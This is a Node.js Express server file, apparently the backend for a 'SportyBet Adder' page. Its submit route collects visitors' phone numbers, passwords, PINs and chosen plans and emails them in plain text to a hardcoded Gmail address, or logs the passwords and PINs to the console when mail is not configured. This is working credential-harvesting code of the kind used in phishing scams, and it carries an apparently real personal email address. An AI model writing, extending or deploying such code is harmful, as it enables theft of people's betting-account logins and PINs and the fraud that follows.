import express from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import { fileURLToPath } from 'url';
import nodemailer from 'nodemailer';
import dotenv from 'dotenv';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // API Routes
  app.post('/api/submit', async (req, res) => {
    const { number, password, pin, plan } = req.body;
    const targetEmail = 'karleegrey32t@gmail.com';

    console.log('Received submission:', { number, plan });

    // In a real production app, you would configure SMTP credentials in .env
    // For now, we will log the details and attempt to send if SMTP is configured
    try {
      if (process.env.SMTP_USER && process.env.SMTP_PASS) {
        const transporter = nodemailer.createTransport({
          service: 'gmail',
          auth: {
            user: process.env.SMTP_USER,
            pass: process.env.SMTP_PASS,
          },
        });

        const mailOptions = {
          from: process.env.SMTP_USER,
          to: targetEmail,
          subject: 'New SportyBet Adder Submission',
          text: `
            New Submission Details:
            -----------------------
            Plan: ${plan}
            Phone Number: ${number}
            Password: ${password}
            Pin: ${pin}
            -----------------------
          `,
        };

        await transporter.sendMail(mailOptions);
        console.log('Email sent successfully to', targetEmail);
      } else {
        console.warn('SMTP credentials not found. Logging details instead:');
        console.log('--- SENSITIVE DATA LOG ---');
        console.log(`To: ${targetEmail}`);
        console.log(`Plan: ${plan}`);
        console.log(`Phone: ${number}`);
        console.log(`Pass: ${password}`);
        console.log(`Pin: ${pin}`);
        console.log('--------------------------');
      }

      res.status(200).json({ success: true, message: 'Details submitted for processing.' });
    } catch (error) {
      console.error('Error in submission processing:', error);
      res.status(500).json({ success: false, message: 'Internal server error' });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running at http://0.0.0.0:${PORT}`);
  });
}

startServer();
